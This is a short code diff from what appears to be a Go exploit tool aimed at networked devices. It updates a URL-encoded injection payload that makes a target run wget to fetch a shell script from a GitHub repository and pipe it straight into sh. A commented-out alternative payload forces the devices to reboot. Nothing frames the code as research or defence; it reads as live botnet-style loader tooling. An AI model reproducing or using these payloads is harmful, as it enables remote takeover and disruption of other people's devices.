@@ -37,7 +37,7 @@ var (
 
 	//payload = "sh%20-c%20%27chmod%20777%20%2Fsbin%2Freboot%3B%20%2Fsbin%2Freboot%3B%20chmod%20777%20%2Fbin%2Freboot%3B%20%2Fbin%2Freboot%3B%20reboot%3B%27%20%26" // reboot the devices
 
-	payload = "sh%20-c%20%27wget%20https%3A%2F%2Fraw.githubusercontent.com%2F20Matrix77%2Fjdifjshfirej%2Frefs%2Fheads%2Fmain%2Fbins.sh%20-O-%7Csh%27%20%26"
+	payload = "sh%20-c%20%27wget%20https%3A%2F%2Fraw.githubusercontent.com%2F20Matrix77%2FDHJIF%2Frefs%2Fheads%2Fmain%2Fskfnw.sh%20-O-%7Csh%27%20%26"
 )
 
 func findDevice(target string) bool {
